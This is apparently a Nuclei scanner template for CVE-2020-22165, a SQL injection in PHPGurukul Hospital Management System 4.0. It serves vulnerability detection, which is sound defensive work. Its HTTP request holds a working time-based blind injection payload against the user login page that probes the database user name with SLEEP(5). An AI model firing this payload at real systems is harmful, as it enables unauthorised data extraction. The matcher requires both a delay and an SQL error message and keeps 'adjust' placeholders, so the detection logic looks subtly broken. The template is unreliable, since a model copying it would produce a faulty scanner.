id: CVE-2020-22165

info:
  name: SQL Injection in PHPGurukul Hospital Management System
  author: ProjectDiscoveryAI
  severity: high
  description: |
    PHPGurukul Hospital Management System in PHP v4.0 has a SQL injection vulnerability in multiple endpoints. Remote unauthenticated users can exploit the vulnerability to obtain database sensitive information.
  remediation: |
    Implement input validation and parameterized queries to prevent SQL injection attacks. Regularly update and patch the application to address security vulnerabilities. Conduct security testing and code reviews to identify and mitigate potential security risks.
  reference:
    - https://github.com/itodaro/PHPGurukul_Hospital_Management_System4.0_cve

http:
  - raw:
      - |
        POST /hms/user-login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        username=a' AND 1=2 UNION SELECT 1,2,IF(SUBSTRING((SELECT USER() LIMIT 0,1),1,1)='r',SLEEP(5),1),4,5,6,7,8,9#&password=asfsafafsafsaf&submit=1&submit=
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - duration > 5
      - type: word
        words:
          - "SQL syntax" # Adjust based on actual response
          - "database error" # Adjust based on actual response